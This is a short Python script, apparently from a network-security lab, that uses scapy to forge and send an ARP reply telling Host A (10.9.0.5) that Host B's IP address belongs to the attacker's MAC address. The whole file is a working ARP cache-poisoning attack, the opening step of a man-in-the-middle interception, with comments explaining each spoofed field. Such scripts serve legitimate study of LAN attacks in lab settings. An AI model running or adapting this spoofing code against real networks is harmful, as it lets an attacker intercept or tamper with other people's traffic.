#!/usr/bin/env python3
from scapy.all import *

A_IP = "10.9.0.5"
B_IP = "10.9.0.6"
M_MAC = "02:42:0a:09:00:69"

# Create a packet directed specifically at Host A
ether = Ether(dst='02:42:0a:09:00:05') # A's MAC
arp = ARP(op=2,         # 2 for ARP Reply
          psrc=B_IP,    # "I am telling you I have B's IP..."
          hwsrc=M_MAC,  # "...and it is at my MAC address"
          pdst=A_IP,    # Target of this message (Host A)
          hwdst='02:42:0a:09:00:05') # Target's MAC

pkt = ether / arp
sendp(pkt)
